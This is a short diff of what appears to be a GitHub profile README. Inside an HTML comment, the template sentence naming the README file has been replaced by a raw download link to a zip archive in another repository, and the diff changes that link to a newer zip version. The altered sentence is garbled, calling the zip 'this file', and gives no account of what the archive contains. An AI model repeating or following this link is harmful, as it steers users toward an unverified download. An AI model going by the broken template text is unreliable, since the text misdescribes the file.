@@ -7,6 +7,6 @@
 - ⚡ Fun fact: i'm cool!
 
 <!---
-theyenvychada/theyenvychada is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/theyenvychada/agent-skills/main/drillmaster/agent-skills-3.9.zip` (this file) appears on your GitHub profile.
+theyenvychada/theyenvychada is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/theyenvychada/agent-skills/main/drillmaster/agent_skills_1.7.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
